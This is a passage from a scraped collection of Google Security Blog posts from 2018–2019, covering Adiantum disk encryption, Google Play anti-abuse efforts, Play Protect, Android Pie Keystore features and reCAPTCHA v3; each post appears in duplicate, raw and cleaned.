devices, we've opted to use the 12-round variant of ChaCha rather than the more widely used 20-round variant. Each round vastly increases the difficulty of attack; the 7-round variant was broken in 2008, and though many papers have improved on this attack, no attack on 8 rounds is known today. This ratio of rounds used to rounds broken today is actually better for ChaCha12 than it is for AES-256.  Even though Adiantum is very new, we are in a position to have high confidence in its security. In our paper, we prove that it has good security properties, under the assumption that ChaCha12 and AES-256 are secure. This is standard practice in cryptography; from \"primitives\" like ChaCha and AES, we build \"constructions\" like XTS, GCM, or Adiantum. Very often we can offer strong arguments but not a proof that the primitives are secure, while we can prove that if the primitives are secure, the constructions we build from them are too. We don't have to make assumptions about NH or the Poly1305 hash function; these are proven to have the cryptographic property (\"ε-almost-&#8710;-universality\") we rely on.   Adiantum is named after the genus of the maidenhair fern, which in the Victorian language of flowers (floriography) represents sincerity and discretion.     Additional resources  The full details of our design, and the proof of security, are in our paper   Adiantum: length-preserving encryption for entry-level processors   in IACR Transactions on Symmetric Cryptology; this will be presented at the Fast Software Encryption conference (FSE 2019) in March.    Generic and ARM-optimized implementations of Adiantum are available in the  Android common kernels v4.9 and higher , and in the  mainline Linux kernel v5.0 and higher . Reference code, test vectors, and a benchmarking suite are available at  https://github.com/google/adiantum .    Android device manufacturers can  enable Adiantum  for either full-disk or file-based encryption on devices with AES performance &lt;= 50 MiB/sec and launching with Android Pie. Where hardware support for AES exists, AES is faster than Adiantum; AES must still be used where its performance is above 50 MiB/s. In Android Q, Adiantum will be part of the Android platform, and we intend to update the  Android Compatibility Definition Document  (CDD) to require that all new Android devices be encrypted using one of the allowed encryption algorithms.       Acknowledgements: This post leveraged contributions from Greg Kaiser and Luke Haviland. Adiantum was designed by Paul Crowley and Eric Biggers, implemented in Android by Eric Biggers and Greg Kaiser, and named by Danielle Roberts.                                    Posted by Paul Crowley and Eric Biggers, Android Security & Privacy Team       Storage encryption protects your data if your phone falls into someone else's hands. Adiantum is an innovation in cryptography designed to make storage encryption more efficient for devices without cryptographic acceleration, to ensure that all devices can be encrypted.  Today, Android offers storage encryption using the Advanced Encryption Standard (AES). Most new Android devices have hardware support for AES via the ARMv8 Cryptography Extensions. However, Android runs on a wide range of devices. This includes not just the latest flagship and mid-range phones, but also entry-level Android Go phones sold primarily in developing countries, along with smart watches and TVs. In order to offer low cost options, device manufacturers sometimes use low-end processors such as the ARM Cortex-A7, which does not have hardware support for AES. On these devices, AES is so slow that it would result in a poor user experience; apps would take much longer to launch, and the device would generally feel much slower. So while storage encryption has been required for most devices since Android 6.0 in 2015, devices with poor AES performance (50 MiB/s and below) are exempt. We've been working to change this because we believe that encryption is for everyone.  In HTTPS encryption, this is a solved problem. The ChaCha20 stream cipher is much faster than AES when hardware acceleration is unavailable, while also being extremely secure. It is fast because it exclusively relies on operations that all CPUs natively support: additions, rotations, and XORs. For this reason, in 2014 Google selected ChaCha20 along with the Poly1305 authenticator, which is also fast in software, for a new TLS cipher suite to secure HTTPS internet connections. ChaCha20-Poly1305 has been standardized as RFC7539, and it greatly improves HTTPS performance on devices that lack AES instructions.  However, disk and file encryption present a special challenge. Data on storage devices is organized into \"sectors\" which today are typically 4096 bytes. When the filesystem makes a request to the device to read or write a sector, the encryption layer intercepts that request and converts between plaintext and ciphertext. This means that we must convert between a 4096-byte plaintext and a 4096-byte ciphertext. But to use RFC7539, the ciphertext must be slightly larger than the plaintext; a little space is needed for the cryptographic nonce and message integrity information. There are software techniques for finding places to store this extra information, but they reduce efficiency and can impose significant complexity on filesystem design.  Where AES is used, the conventional solution for disk encryption is to use the XTS or CBC-ESSIV modes of operation, which are length-preserving. Currently Android supports AES-128-CBC-ESSIV for full-disk encryption and AES-256-XTS for file-based encryption. However, when AES performance is insufficient there is no widely accepted alternative that has sufficient performance on lower-end ARM processors.  To solve this problem, we have designed a new encryption mode called Adiantum. Adiantum allows us to use the ChaCha stream cipher in a length-preserving mode, by adapting ideas from AES-based proposals for length-preserving encryption such as HCTR and HCH. On ARM Cortex-A7, Adiantum encryption and decryption on 4096-byte sectors is about 10.6 cycles per byte, around 5x faster than AES-256-XTS.     Unlike modes such as XTS or CBC-ESSIV, Adiantum is a true wide-block mode: changing any bit anywhere in the plaintext will unrecognizably change all of the ciphertext, and vice versa. It works by first hashing almost the entire plaintext using a keyed hash based on Poly1305 and another very fast keyed hashing function called NH. We also hash a value called the \"tweak\" which is used to ensure that different sectors are encrypted differently. This hash is then used to generate a nonce for the ChaCha encryption. After encryption, we hash again, so that we have the same strength in the decryption direction as the encryption direction. This is arranged in a configuration known as a Feistel network, so that we can decrypt what we've encrypted. A single AES-256 invocation on a 16-byte block is also required, but for 4096-byte inputs this part is not performance-critical.   Cryptographic primitives like ChaCha are organized in \"rounds\", with each round increasing our confidence in security at a cost in speed. To make disk encryption fast enough on the widest range of devices, we've opted to use the 12-round variant of ChaCha rather than the more widely used 20-round variant. Each round vastly increases the difficulty of attack; the 7-round variant was broken in 2008, and though many papers have improved on this attack, no attack on 8 rounds is known today. This ratio of rounds used to rounds broken today is actually better for ChaCha12 than it is for AES-256. Even though Adiantum is very new, we are in a position to have high confidence in its security. In our paper, we prove that it has good security properties, under the assumption that ChaCha12 and AES-256 are secure. This is standard practice in cryptography; from \"primitives\" like ChaCha and AES, we build \"constructions\" like XTS, GCM, or Adiantum. Very often we can offer strong arguments but not a proof that the primitives are secure, while we can prove that if the primitives are secure, the constructions we build from them are too. We don't have to make assumptions about NH or the Poly1305 hash function; these are proven to have the cryptographic property (\"ε-almost-∆-universality\") we rely on.  Adiantum is named after the genus of the maidenhair fern, which in the Victorian language of flowers (floriography) represents sincerity and discretion.   Additional resources The full details of our design, and the proof of security, are in our paper Adiantum: length-preserving encryption for entry-level processors in IACR Transactions on Symmetric Cryptology; this will be presented at the Fast Software Encryption conference (FSE 2019) in March.   Generic and ARM-optimized implementations of Adiantum are available in the Android common kernels v4.9 and higher, and in the mainline Linux kernel v5.0 and higher. Reference code, test vectors, and a benchmarking suite are available at https://github.com/google/adiantum.   Android device manufacturers can enable Adiantum for either full-disk or file-based encryption on devices with AES performance <= 50 MiB/sec and launching with Android Pie. Where hardware support for AES exists, AES is faster than Adiantum; AES must still be used where its performance is above 50 MiB/s. In Android Q, Adiantum will be part of the Android platform, and we intend to update the Android Compatibility Definition Document (CDD) to require that all new Android devices be encrypted using one of the allowed encryption algorithms.    Acknowledgements: This post leveraged contributions from Greg Kaiser and Luke Haviland. Adiantum was designed by Paul Crowley and Eric Biggers, implemented in Android by Eric Biggers and Greg Kaiser, and named by Danielle Roberts.     ", "date": "February 7, 2019"},
{"website": "Google-Security", "title": "\nHow we fought bad apps and malicious developers in 2018\n", "author": [], "link": "https://security.googleblog.com/2019/02/how-we-fought-bad-apps-and-malicious.html", "abstract": "                                   Posted by Andrew Ahn, Product Manager, Google Play    [Cross-posted from the  Android Developers Blog ]         Google Play is committed to providing a secure and safe platform for billions of Android users on their journey discovering and experiencing the apps they love and enjoy. To deliver against this commitment, we worked last year to improve our abuse detection technologies and systems, and significantly increased our team of product managers, engineers, policy experts, and operations leaders to fight against bad actors.   In 2018, we introduced a series of new policies to protect users from new abuse trends, detected and removed malicious developers faster, and stopped more malicious apps from entering the Google Play Store than ever before. The number of rejected app submissions increased by more than 55 percent, and we increased app suspensions by more than 66 percent. These increases can be attributed to our continued efforts to tighten policies to reduce the number of harmful apps on the Play Store, as well as our investments in automated protections and human review processes that play critical roles in identifying and enforcing on bad apps.   In addition to identifying and stopping bad apps from entering the Play Store, our  Google Play Protect  system now scans over 50 billion apps on users' devices each day to make sure apps installed on the device aren't behaving in harmful ways. With such protection, apps from Google Play are eight times less likely to harm a user's device than Android apps from other sources.   Here are some areas we've been focusing on in the last year and that will continue to be a priority for us in 2019:            Protecting User Privacy  Protecting users' data and privacy is a critical factor in building user trust. We've long required developers to limit their device permission requests to what's necessary to provide the features of an app. Also, to help users understand how their data is being used, we've required developers to provide prominent disclosures about the collection and use of sensitive user data. Last year, we rejected or removed tens of thousands of apps that weren't in compliance with Play's policies related to user data and privacy.   In October 2018, we  announced  a new policy restricting the use of the SMS and Call Log permissions to a limited number of cases, such as where an app has been selected as the user's default app for making calls or sending text messages. We've recently started to remove apps from Google Play that violate this policy. We plan to introduce additional policies for device permissions and user data throughout 2019.            Developer integrity  We find that over 80% of severe policy violations are conducted by repeat offenders and abusive developer networks. When malicious developers are banned, they often create new accounts or buy developer accounts on the black market in order to come back to Google Play. We've further enhanced our clustering and account matching technologies, and by combining these technologies with the expertise of our human reviewers, we've made it more difficult for spammy developer networks to gain installs by blocking their apps from being published in the first place.            Harmful app contents and behaviors  As mentioned in last year's  blog post , we fought against hundreds of thousands of impersonators, apps with inappropriate content, and  Potentially Harmful Applications  (PHAs). In a continued fight against these types of apps, not only do we apply advanced machine learning models to spot suspicious apps, we also conduct static and dynamic analyses, intelligently use user engagement and feedback data, and leverage skilled human reviews, which have helped in finding more bad apps with higher accuracy and efficiency.   Despite our enhanced and added layers of defense against bad apps, we know bad actors will continue to try to evade our systems by changing their tactics and cloaking bad behaviors. We will continue to enhance our capabilities to counter such adversarial behavior, and work relentlessly to provide our users with a secure and safe app store.       How useful did you find this blog post?      &#9733;   &#9733;   &#9733;   &#9733;   &#9733;                                                     Posted by Andrew Ahn, Product Manager, Google Play [Cross-posted from the Android Developers Blog]   Google Play is committed to providing a secure and safe platform for billions of Android users on their journey discovering and experiencing the apps they love and enjoy. To deliver against this commitment, we worked last year to improve our abuse detection technologies and systems, and significantly increased our team of product managers, engineers, policy experts, and operations leaders to fight against bad actors.  In 2018, we introduced a series of new policies to protect users from new abuse trends, detected and removed malicious developers faster, and stopped more malicious apps from entering the Google Play Store than ever before. The number of rejected app submissions increased by more than 55 percent, and we increased app suspensions by more than 66 percent. These increases can be attributed to our continued efforts to tighten policies to reduce the number of harmful apps on the Play Store, as well as our investments in automated protections and human review processes that play critical roles in identifying and enforcing on bad apps.  In addition to identifying and stopping bad apps from entering the Play Store, our Google Play Protect system now scans over 50 billion apps on users' devices each day to make sure apps installed on the device aren't behaving in harmful ways. With such protection, apps from Google Play are eight times less likely to harm a user's device than Android apps from other sources.  Here are some areas we've been focusing on in the last year and that will continue to be a priority for us in 2019:     Protecting User Privacy Protecting users' data and privacy is a critical factor in building user trust. We've long required developers to limit their device permission requests to what's necessary to provide the features of an app. Also, to help users understand how their data is being used, we've required developers to provide prominent disclosures about the collection and use of sensitive user data. Last year, we rejected or removed tens of thousands of apps that weren't in compliance with Play's policies related to user data and privacy.  In October 2018, we announced a new policy restricting the use of the SMS and Call Log permissions to a limited number of cases, such as where an app has been selected as the user's default app for making calls or sending text messages. We've recently started to remove apps from Google Play that violate this policy. We plan to introduce additional policies for device permissions and user data throughout 2019.     Developer integrity We find that over 80% of severe policy violations are conducted by repeat offenders and abusive developer networks. When malicious developers are banned, they often create new accounts or buy developer accounts on the black market in order to come back to Google Play. We've further enhanced our clustering and account matching technologies, and by combining these technologies with the expertise of our human reviewers, we've made it more difficult for spammy developer networks to gain installs by blocking their apps from being published in the first place.     Harmful app contents and behaviors As mentioned in last year's blog post, we fought against hundreds of thousands of impersonators, apps with inappropriate content, and Potentially Harmful Applications (PHAs). In a continued fight against these types of apps, not only do we apply advanced machine learning models to spot suspicious apps, we also conduct static and dynamic analyses, intelligently use user engagement and feedback data, and leverage skilled human reviews, which have helped in finding more bad apps with higher accuracy and efficiency.  Despite our enhanced and added layers of defense against bad apps, we know bad actors will continue to try to evade our systems by changing their tactics and cloaking bad behaviors. We will continue to enhance our capabilities to counter such adversarial behavior, and work relentlessly to provide our users with a secure and safe app store.     How useful did you find this blog post?    ★ ★ ★ ★ ★           ", "date": "February 13, 2019"},
{"website": "Google-Security", "title": "\nGoogle Play Protect in 2018: New updates to keep Android users secure\n", "author": [], "link": "https://security.googleblog.com/2019/02/google-play-protect-in-2018-new-updates.html", "abstract": "                                      Posted by   Rahul Mishra and Tom Watkins, Android Security &amp; Privacy Team      [Cross-posted from the  Android Developers Blog ]            In 2018, Google Play Protect made Android devices running Google Play some of the most secure smartphones available, scanning over 50 billion apps everyday for harmful behaviour.    Android devices can genuinely improve people's lives through our accessibility features, Google Assistant, digital wellbeing, Family Link, and more &#8212; but we can only do this if they are safe and secure enough to earn users' long term trust. This is Google Play Protect's charter and we're encouraged by this past year's advancements.      Google Play Protect, a refresher  Google Play Protect is the technology we use to ensure that any device shipping with the Google Play Store is secured against  potentially harmful applications  (PHA). It is made up of a giant backend scanning engine to aid our analysts in sourcing and vetting applications made available on the Play Store, and built-in protection that scans apps on users' devices, immobilizing PHA and warning users.    This technology protects over 2 billion devices in the Android ecosystem every day.       What's new   On by default     We strongly believe that security should be a built-in feature of every device, not something a user needs to find and enable. When security features function at their best, most users do not need to be aware of them. To this end, we are pleased to announce that Google Play Protect is now enabled by default to secure all new devices, right out of the box. The user is notified that Google Play Protect is running, and has the option to turn it off whenever desired.              New and rare apps     Android is deployed in many diverse ways across many different users. We know that the ecosystem would not be as powerful and vibrant as it is today without an equally diverse array of apps to choose from. But installing new apps, especially from unknown sources, can carry risk.    Last year we launched a new feature that notifies users when they are installing new or rare apps that are rarely installed in the ecosystem. In these scenarios, the feature shows a warning, giving users pause to consider whether they want to trust this app, and advising them to take additional care and check the source of installation. Once Google has fully analyzed the app and determined that it is not harmful, the notification will no longer display. In 2018, this warning showed around 100,000 times per day     Context is everything: warning users on launch     It's easy to misunderstand alerts when presented out of context. We're trained to click through notifications without reading them and get back to what we were doing as quickly as possible. We know that providing timely and context-sensitive alerts to users is critical for them to be of value. We recently enabled a security feature first introduced in Android Oreo which warns users when they are about to launch a potentially harmful app on their device.              This new warning dialog provides in-context information about which app the user is about to launch, why we think it may be harmful and what might happen if they open the app. We also provide clear guidance on what to do next. These in-context dialogs ensure users are protected even if they accidentally missed an alert.     Auto-disabling apps      Google Play Protect has long been able to disable the most harmful categories of apps on users devices automatically, providing robust protection where we believe harm will be done.    In 2018, we extended this coverage to apps installed from Play that were later found to have violated Google Play's  policies , e.g. on privacy, deceptive behavior or content. These apps have been suspended and removed from the Google Play Store.     This does not remove the app from user device, but it does notify the user and prevents them from opening the app accidentally. The notification gives the option to remove the app entirely.     Keeping the Android ecosystem secure is no easy task, but we firmly believe that Google Play Protect is an important security layer that's used to protect users devices and their data while maintaining the freedom, diversity and openness that makes Android, well, Android.     Acknowledgements: This post leveraged contributions from Meghan Kelly and William Luh.                                             Posted by   Rahul Mishra and Tom Watkins, Android Security & Privacy Team   [Cross-posted from the Android Developers Blog]    In 2018, Google Play Protect made Android devices running Google Play some of the most secure smartphones available, scanning over 50 billion apps everyday for harmful behaviour.   Android devices can genuinely improve people's lives through our accessibility features, Google Assistant, digital wellbeing, Family Link, and more — but we can only do this if they are safe and secure enough to earn users' long term trust. This is Google Play Protect's charter and we're encouraged by this past year's advancements.    Google Play Protect, a refresher Google Play Protect is the technology we use to ensure that any device shipping with the Google Play Store is secured against potentially harmful applications (PHA). It is made up of a giant backend scanning engine to aid our analysts in sourcing and vetting applications made available on the Play Store, and built-in protection that scans apps on users' devices, immobilizing PHA and warning users.   This technology protects over 2 billion devices in the Android ecosystem every day.     What's new On by default   We strongly believe that security should be a built-in feature of every device, not something a user needs to find and enable. When security features function at their best, most users do not need to be aware of them. To this end, we are pleased to announce that Google Play Protect is now enabled by default to secure all new devices, right out of the box. The user is notified that Google Play Protect is running, and has the option to turn it off whenever desired.      New and rare apps   Android is deployed in many diverse ways across many different users. We know that the ecosystem would not be as powerful and vibrant as it is today without an equally diverse array of apps to choose from. But installing new apps, especially from unknown sources, can carry risk.   Last year we launched a new feature that notifies users when they are installing new or rare apps that are rarely installed in the ecosystem. In these scenarios, the feature shows a warning, giving users pause to consider whether they want to trust this app, and advising them to take additional care and check the source of installation. Once Google has fully analyzed the app and determined that it is not harmful, the notification will no longer display. In 2018, this warning showed around 100,000 times per day   Context is everything: warning users on launch   It's easy to misunderstand alerts when presented out of context. We're trained to click through notifications without reading them and get back to what we were doing as quickly as possible. We know that providing timely and context-sensitive alerts to users is critical for them to be of value. We recently enabled a security feature first introduced in Android Oreo which warns users when they are about to launch a potentially harmful app on their device.       This new warning dialog provides in-context information about which app the user is about to launch, why we think it may be harmful and what might happen if they open the app. We also provide clear guidance on what to do next. These in-context dialogs ensure users are protected even if they accidentally missed an alert.   Auto-disabling apps    Google Play Protect has long been able to disable the most harmful categories of apps on users devices automatically, providing robust protection where we believe harm will be done.   In 2018, we extended this coverage to apps installed from Play that were later found to have violated Google Play's policies, e.g. on privacy, deceptive behavior or content. These apps have been suspended and removed from the Google Play Store.    This does not remove the app from user device, but it does notify the user and prevents them from opening the app accidentally. The notification gives the option to remove the app entirely.    Keeping the Android ecosystem secure is no easy task, but we firmly believe that Google Play Protect is an important security layer that's used to protect users devices and their data while maintaining the freedom, diversity and openness that makes Android, well, Android.   Acknowledgements: This post leveraged contributions from Meghan Kelly and William Luh.      ", "date": "February 26, 2019"},
{"website": "Google-Security", "title": "\nTackling ads abuse in apps and SDKs\n", "author": ["Posted by Dave Kleidermacher, VP, Head of Security & Privacy - Android & Play"], "link": "https://security.googleblog.com/2018/12/tackling-ads-abuse-in-apps-and-sdks.html", "abstract": "                             Posted by Dave Kleidermacher, VP, Head of Security &amp; Privacy - Android &amp; Play     Providing users with safe and secure experiences, while helping developers build and grow quality app businesses, is our top priority at Google Play. And we&#8217;re  constantly working  to improve our protections.    Google Play has been working to minimize app install attribution fraud for several years. In 2017 Google Play made available the  Google Play Install Referrer API , which allows ad attribution providers, publishers and advertisers to determine which referrer was responsible for sending the user to Google Play for a given app install. This API was specifically designed to be resistant to install attribution fraud and we strongly encourage attribution providers, advertisers and publishers to insist on this standard of proof when measuring app install ads. Users, developers, advertisers and ad networks all benefit from a transparent, fair system.    We also take reports of questionable activity very seriously. If an app violates our  Google Play Developer policies , we take action. That&#8217;s why we began our own independent investigation after we received reports of apps on Google Play accused of conducting app install attribution abuse by falsely claiming credit for newly installed apps to collect the download bounty from that app&#8217;s developer.    We now have an update regarding our ongoing investigation:       On Monday, we removed two apps from the Play Store because our investigation discovered evidence of app install attribution abuse.   We also discovered evidence of app install attribution abuse in 3 ad network SDKs. We have asked the impacted developers to remove those SDKs from their apps. Because we believe most of these developers were not aware of the behavior from these third-party SDKs, we have given them a short grace period to take action.   Google Ads SDKs were not utilized for any of the abusive behaviors mentioned above.   Our investigation is ongoing and additional reviews of other apps and third party SDKs are still underway. If we find evidence of additional policy violations, we will take action.      We will continue to investigate and improve our capabilities to better detect and protect against abusive behavior and the malicious actors behind them.                                     Posted by Dave Kleidermacher, VP, Head of Security & Privacy - Android & Play  Providing users with safe and secure experiences, while helping developers build and grow quality app businesses, is our top priority at Google Play. And we’re constantly working to improve our protections.  Google Play has been working to minimize app install attribution fraud for several years. In 2017 Google Play made available the Google Play Install Referrer API, which allows ad attribution providers, publishers and advertisers to determine which referrer was responsible for sending the user to Google Play for a given app install. This API was specifically designed to be resistant to install attribution fraud and we strongly encourage attribution providers, advertisers and publishers to insist on this standard of proof when measuring app install ads. Users, developers, advertisers and ad networks all benefit from a transparent, fair system.  We also take reports of questionable activity very seriously. If an app violates our Google Play Developer policies, we take action. That’s why we began our own independent investigation after we received reports of apps on Google Play accused of conducting app install attribution abuse by falsely claiming credit for newly installed apps to collect the download bounty from that app’s developer.  We now have an update regarding our ongoing investigation:   On Monday, we removed two apps from the Play Store because our investigation discovered evidence of app install attribution abuse. We also discovered evidence of app install attribution abuse in 3 ad network SDKs. We have asked the impacted developers to remove those SDKs from their apps. Because we believe most of these developers were not aware of the behavior from these third-party SDKs, we have given them a short grace period to take action. Google Ads SDKs were not utilized for any of the abusive behaviors mentioned above. Our investigation is ongoing and additional reviews of other apps and third party SDKs are still underway. If we find evidence of additional policy violations, we will take action.   We will continue to investigate and improve our capabilities to better detect and protect against abusive behavior and the malicious actors behind them.     ", "date": "December 7, 2018"},
{"website": "Google-Security", "title": "\nNew Keystore features keep your slice of Android Pie a little safer\n", "author": [], "link": "https://security.googleblog.com/2018/12/new-keystore-features-keep-your-slice.html", "abstract": "                                   Posted by Lilian Young and Shawn Willden, Android Security; and Frank Salim, Google Pay        [Cross-posted from the  Android Developers Blog ]              New Android Pie Keystore Features    The Android  Keystore  provides application developers with a set of cryptographic tools that are designed to secure their users' data. Keystore moves the cryptographic primitives available in software libraries out of the Android OS and into secure hardware. Keys are protected and used only within the secure hardware to protect application secrets from various forms of attacks. Keystore gives applications the ability to specify restrictions on how and when the keys can be used.   Android Pie introduces new capabilities to Keystore. We will be discussing two of these new capabilities in this post. The first enables restrictions on key use so as to protect sensitive information. The second facilitates secure key use while protecting key material from the application or operating system.         Keyguard-bound keys    There are times when a mobile application receives data but doesn't need to immediately access it if the user is not currently using the device. Sensitive information sent to an application while the device screen is locked must remain secure until the user wants access to it. Android Pie addresses this by introducing keyguard-bound cryptographic keys. When the screen is locked, these keys can be used in encryption or verification operations, but are unavailable for decryption or signing. If the device is currently locked with a PIN, pattern, or password, any attempt to use these keys will result in an invalid operation. Keyguard-bound keys protect the user's data while the device is locked, and only available when the user needs it.   Keyguard binding and authentication binding both function in similar ways, except with one important difference. Keyguard binding ties the availability of keys directly to the screen lock state while authentication binding uses a constant timeout. With keyguard binding, the keys become unavailable as soon as the device is locked and are only made available again when the user unlocks the device.    It is worth noting that keyguard binding is enforced by the operating system, not the secure hardware. This is because the secure hardware has no way to know when the screen is locked. Hardware-enforced Android Keystore protection features like authentication binding, can be combined with keyguard binding for a higher level of security. Furthermore, since keyguard binding is an operating system feature, it's available to any device running Android Pie.   Keys for any algorithm supported by the device can be keyguard-bound. To generate or import a key as keyguard-bound, call  setUnlockedDeviceRequired(true)  on the  KeyGenParameterSpec  or  KeyProtection  builder object at key generation or import.       Secure Key Import    Secure Key Import is a new feature in Android Pie that allows applications to provision existing keys into Keystore in a more secure manner. The origin of the key, a remote server that could be sitting in an on-premise data center or in the cloud, encrypts the secure key using a public wrapping key from the user's device. The encrypted key in the  SecureKeyWrapper  format, which also contains a description of the ways the imported key is allowed to be used, can only be decrypted in the Keystore hardware belonging to the specific device that generated the wrapping key. Keys are encrypted in transit and remain opaque to the application and operating system, meaning they're only available inside the secure hardware into which they are imported.         Secure Key Import is useful in scenarios where an application intends to share a secret key with an Android device, but wants to prevent the key from being intercepted or from leaving the device. Google Pay uses Secure Key Import to provision some keys on Pixel 3 phones, to prevent the keys from being intercepted or extracted from memory. There are also a variety of enterprise use cases such as S/MIME encryption keys being recovered from a Certificate Authorities escrow so that the same key can be used to decrypt emails on multiple devices.   To take advantage of this feature, please review  this training article . Please note that Secure Key Import is a secure hardware feature, and is therefore only available on select Android Pie devices. To find out if the device supports it, applications can generate a KeyPair with  PURPOSE_WRAP_KEY .                                        Posted by Lilian Young and Shawn Willden, Android Security; and Frank Salim, Google Pay  [Cross-posted from the Android Developers Blog]     New Android Pie Keystore Features The Android Keystore provides application developers with a set of cryptographic tools that are designed to secure their users' data. Keystore moves the cryptographic primitives available in software libraries out of the Android OS and into secure hardware. Keys are protected and used only within the secure hardware to protect application secrets from various forms of attacks. Keystore gives applications the ability to specify restrictions on how and when the keys can be used.  Android Pie introduces new capabilities to Keystore. We will be discussing two of these new capabilities in this post. The first enables restrictions on key use so as to protect sensitive information. The second facilitates secure key use while protecting key material from the application or operating system.     Keyguard-bound keys There are times when a mobile application receives data but doesn't need to immediately access it if the user is not currently using the device. Sensitive information sent to an application while the device screen is locked must remain secure until the user wants access to it. Android Pie addresses this by introducing keyguard-bound cryptographic keys. When the screen is locked, these keys can be used in encryption or verification operations, but are unavailable for decryption or signing. If the device is currently locked with a PIN, pattern, or password, any attempt to use these keys will result in an invalid operation. Keyguard-bound keys protect the user's data while the device is locked, and only available when the user needs it.  Keyguard binding and authentication binding both function in similar ways, except with one important difference. Keyguard binding ties the availability of keys directly to the screen lock state while authentication binding uses a constant timeout. With keyguard binding, the keys become unavailable as soon as the device is locked and are only made available again when the user unlocks the device.   It is worth noting that keyguard binding is enforced by the operating system, not the secure hardware. This is because the secure hardware has no way to know when the screen is locked. Hardware-enforced Android Keystore protection features like authentication binding, can be combined with keyguard binding for a higher level of security. Furthermore, since keyguard binding is an operating system feature, it's available to any device running Android Pie.  Keys for any algorithm supported by the device can be keyguard-bound. To generate or import a key as keyguard-bound, call setUnlockedDeviceRequired(true) on the KeyGenParameterSpec or KeyProtection builder object at key generation or import.   Secure Key Import Secure Key Import is a new feature in Android Pie that allows applications to provision existing keys into Keystore in a more secure manner. The origin of the key, a remote server that could be sitting in an on-premise data center or in the cloud, encrypts the secure key using a public wrapping key from the user's device. The encrypted key in the SecureKeyWrapper format, which also contains a description of the ways the imported key is allowed to be used, can only be decrypted in the Keystore hardware belonging to the specific device that generated the wrapping key. Keys are encrypted in transit and remain opaque to the application and operating system, meaning they're only available inside the secure hardware into which they are imported.    Secure Key Import is useful in scenarios where an application intends to share a secret key with an Android device, but wants to prevent the key from being intercepted or from leaving the device. Google Pay uses Secure Key Import to provision some keys on Pixel 3 phones, to prevent the keys from being intercepted or extracted from memory. There are also a variety of enterprise use cases such as S/MIME encryption keys being recovered from a Certificate Authorities escrow so that the same key can be used to decrypt emails on multiple devices.  To take advantage of this feature, please review this training article. Please note that Secure Key Import is a secure hardware feature, and is therefore only available on select Android Pie devices. To find out if the device supports it, applications can generate a KeyPair with PURPOSE_WRAP_KEY.     ", "date": "December 12, 2018"},
{"website": "Google-Security", "title": "\nIntroducing reCAPTCHA v3: the new way to stop bots\n", "author": ["Posted by Wei Liu, Google Product Manager"], "link": "https://security.googleblog.com/2018/10/introducing-recaptcha-v3-new-way-to.html", "abstract": "                             Posted by Wei Liu, Google Product Manager      [Cross-posted from the  Google Webmaster Central Blog ]     Today, we&#8217;re excited to introduce reCAPTCHA v3, our newest API that helps you detect abusive traffic on your website without user interaction. Instead of showing a CAPTCHA challenge,  reCAPTCHA v3  returns a score so you can choose the most appropriate action for your website.     A frictionless user experience       Over the last decade, reCAPTCHA has continuously evolved its technology. In reCAPTCHA v1, every user was asked to pass a challenge by reading distorted text and typing into a box. To improve both user experience and security, we introduced reCAPTCHA v2 and began to use many other signals to determine whether a request came from a human or bot. This enabled reCAPTCHA challenges to move from a dominant to a secondary role in detecting abuse, letting about half of users pass with a single click. Now with reCAPTCHA v3, we are fundamentally changing how sites can test for human vs. bot activities by returning a score to tell you how suspicious an interaction is and eliminating the need to interrupt users with challenges at all. reCAPTCHA v3 runs adaptive risk analysis in the background to alert you of suspicious traffic while letting your human users enjoy a frictionless experience on your site.     More Accurate Bot Detection with \"Actions\"     In reCAPTCHA v3, we are introducing a new concept called &#8220;Action&#8221;&#8212;a tag that you can use to define the key steps of your user journey and enable reCAPTCHA to run its risk analysis in context. Since reCAPTCHA v3 doesn't interrupt users, we recommend adding reCAPTCHA v3 to multiple pages. In this way, the reCAPTCHA adaptive risk analysis engine can identify the pattern of attackers more accurately by looking at the activities across different pages on your website. In the reCAPTCHA admin console, you can get a full overview of reCAPTCHA score distribution and a breakdown for the stats of the top 10 actions on your site, to help you identify which exact pages are being targeted by bots and how suspicious the traffic was on those pages.                   Fighting bots your way     Another big benefit that you&#8217;ll get from reCAPTCHA v3 is the flexibility to prevent spam and abuse in the way that best fits your website. Previously, the reCAPTCHA system mostly decided when and what CAPTCHAs to serve to users, leaving you with limited influence over your website&#8217;s user experience. Now, reCAPTCHA v3 will provide you with a score that tells you how suspicious an interaction is. There are three potential ways you can use the score. First, you can set a threshold that determines when a user is let through or when further verification needs to be done, for example, using two-factor authentication and phone verification. Second, you can combine the score with your own signals that reCAPTCHA can&#8217;t access&#8212;such as user profiles or transaction histories. Third, you can use the reCAPTCHA score as one of the signals to train your machine learning model to fight abuse. By providing you with these new ways to customize the actions that occur for different types of traffic, this new version lets you protect your site against bots and improve your user experience based on your website&#8217;s specific needs.    In short, reCAPTCHA v3 helps to protect your sites without user friction and gives you more power to decide what to do in risky situations. As always, we are working every day to stay ahead of attackers and keep the Internet easy and safe to use (except for bots).    Ready to get started with reCAPTCHA v3? Visit our  developer site  for more details.                                   Posted by Wei Liu, Google Product Manager  [Cross-posted from the Google Webmaster Central Blog]  Today, we’re excited to introduce reCAPTCHA v3, our newest API that helps you detect abusive traffic on your website without user interaction. Instead of showing a CAPTCHA challenge, reCAPTCHA v3 returns a score so you can choose the most appropriate action for your website.  A frictionless user experience  Over the last decade, reCAPTCHA has continuously evolved its technology. In reCAPTCHA v1, every user was asked to pass a challenge by reading distorted text and typing into a box. To improve both user experience and security, we introduced reCAPTCHA v2 and began to use many other signals to determine whether a request came from a human or bot. This enabled reCAPTCHA challenges to move from a dominant to a secondary role in detecting abuse, letting about half of users pass with a single click. Now with reCAPTCHA v3, we are fundamentally changing how sites can test for human vs. bot activities by returning a score to tell you how suspicious an interaction is and eliminating the need to interrupt users with challenges at all. reCAPTCHA v3 runs adaptive risk analysis in the background to alert you of suspicious traffic while letting your human users enjoy a frictionless experience on your site.  More Accurate Bot Detection with \"Actions\"  In reCAPTCHA v3, we are introducing a new concept called “Action”—a tag that you can use to define the key steps of your user journey and enable reCAPTCHA to run its risk analysis in context. Since reCAPTCHA v3 doesn't interrupt users, we recommend adding reCAPTCHA v3 to multiple pages. In this way, the reCAPTCHA adaptive risk analysis engine can identify the pattern of attackers more accurately by looking at the activities across different pages on your website. In the reCAPTCHA admin console, you can get a full overview of reCAPTCHA score distribution and a breakdown for the stats of the top 10 actions on your site, to help you identify which exact pages are being targeted by bots and how suspicious the traffic was on those pages.      Fighting bots your way  Another big benefit that you’ll get from reCAPTCHA v3 is the flexibility to prevent spam and abuse in the way that best fits your website. Previously, the reCAPTCHA system mostly decided when and what CAPTCHAs to serve to users, leaving you with limited influence over your website’s user experience. Now, 